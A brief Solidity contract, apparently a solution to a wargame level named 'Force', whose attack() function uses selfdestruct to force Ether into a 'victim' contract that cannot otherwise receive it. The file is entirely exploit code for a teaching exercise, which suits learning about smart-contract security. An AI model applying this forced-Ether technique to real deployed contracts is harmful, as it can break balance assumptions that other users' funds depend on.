// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "./Force.sol";

contract Solution11 {
    Force public victim;

    constructor(Force victim_) public {
        victim = victim_;
    }

    function attack() external payable {
        selfdestruct(payable(address(victim)));
    }
}
